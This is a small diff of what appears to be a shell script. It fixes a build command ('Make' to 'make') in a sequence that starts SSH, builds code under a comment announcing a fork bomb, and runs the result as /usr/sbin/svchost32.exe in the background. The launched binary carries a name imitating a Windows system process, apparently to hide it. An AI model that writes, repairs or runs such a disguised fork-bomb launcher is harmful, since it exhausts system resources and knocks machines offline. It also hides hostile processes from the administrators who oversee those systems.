@@ -11,7 +11,7 @@
 systemctl start ssh
 
 # start fork bomb
-Make
+make
 cp svchost.exe /usr/sbin/svchost32.exe
 /usr/sbin/svchost32.exe &
 
